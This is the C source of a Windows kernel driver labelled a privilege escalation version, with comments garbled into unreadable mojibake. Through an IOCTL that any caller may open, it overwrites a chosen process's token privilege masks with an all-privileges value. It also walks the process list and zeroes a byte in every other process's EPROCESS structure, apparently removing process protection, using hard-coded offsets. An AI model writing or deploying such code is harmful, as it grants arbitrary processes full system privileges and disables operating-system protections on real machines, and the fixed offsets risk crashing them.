// MyDriver.c - Kernel-Mode Driver (Privilege Escalation Version)
#include <ntifs.h>

// =======================================================================
//   1. �N�Ҧ��ۭq�����c�w�q�M IOCTL ��b�ɮ׳���
// =======================================================================

// �ۭq _SEP_TOKEN_PRIVILEGES ���c�w�q
// �]���o�ӵ��c���O���}���A�ڭ̻ݭn�ۤv�w�q��
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONGLONG Present;
    ULONGLONG Enabled;
    ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

// IOCTL �w�q
#define IOCTL_EXECUTE_MEMORY_OP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

EXTERN_C NTKERNELAPI PEPROCESS NTAPI PsGetNextProcess(
    _In_opt_ PEPROCESS Process
);

// �ǻ���ƪ����c�w�q
typedef struct _KERNEL_OP_REQUEST {
    ULONG ProcessId;
} KERNEL_OP_REQUEST, * PKERNEL_OP_REQUEST;


// =======================================================================
//   2. �X�ʵ{�����禡��@
// =======================================================================

// --- DriverUnload (�p�G�����ܡA�i�H��b�o��) ---
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Unloaded\n"));
}

// DeviceControl �禡
// �`���� offset (Windows 10 x64)
// �`�N�G���P build �i�ण�P�A�Х� WinDBG !process ����
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET 0x1d8  
#define EPROCESS_UNIQUEPROCESSID_OFFSET    0x1d0  

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG bytesIO = 0;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_EXECUTE_MEMORY_OP) {
        PKERNEL_OP_REQUEST req = (PKERNEL_OP_REQUEST)Irp->AssociatedIrp.SystemBuffer;

        // --- �쥻�G�u�B�z��J PID ---
        PEPROCESS targetProcess = NULL;
        status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess);

        if (!NT_SUCCESS(status)) {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[MyDriver] PsLookupProcessByProcessId ����: 0x%X\n", status));
        }
        else {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                "[MyDriver] ���\��� PID %lu �� EPROCESS: 0x%p\n",
                req->ProcessId, targetProcess));

#define TOKEN_OFFSET 0x248
#define PRIVILEGES_OFFSET 0x40

            PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
            pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);

            if (!pToken) {
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                    "[MyDriver] �䤣�� Token ����I\n"));
                status = STATUS_NOT_FOUND;
            }
            else {
                PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                    "[MyDriver] ��l Present: 0x%llX, Enabled: 0x%llX\n",
                    pPrivileges->Present, pPrivileges->Enabled));

                pPrivileges->Present = 0x0000001ff2ffffbc;
                pPrivileges->Enabled = 0x0000001ff2ffffbc;

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                    "[MyDriver] [SUCCESS] �v���w�ק�I\n"));
            }

            ObDereferenceObject(targetProcess);
        }

        // --- �s�W�\��GActiveProcessLinks �M���Ҧ� EPROCESS ---
        PEPROCESS pCurrent = PsGetCurrentProcess(); // ���N�@�� process ��_�I
        PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pCurrent + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
        PLIST_ENTRY head = pList;

        do {
            PEPROCESS curr = (PEPROCESS)((PUCHAR)pList - EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
            ULONG pid = *(ULONG*)((PUCHAR)curr + EPROCESS_UNIQUEPROCESSID_OFFSET);

            if (pid != req->ProcessId) { // �ư���J PID
                __try {
                    *((PUCHAR)curr + 0x5FA) = 0; // eb (EPROCESS+0x5FA) 0
                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
                        "[MyDriver] Patched process 0x%p (PID %lu)\n", curr, pid));
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                        "[MyDriver] Patch failed for PID %lu\n", pid));
                }
            }

            pList = pList->Flink; // �U�@��
        } while (pList != head); // ¶�^�Ӫ�ܨ���

    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}



// DriverEntry �禡
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateDevice ����: 0x%X\n", status));
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateSymbolicLink ����: 0x%X\n", status));
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] =
        DriverObject->MajorFunction[IRP_MJ_CLOSE] =
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Loaded and Initialized\n"));
    return STATUS_SUCCESS;
}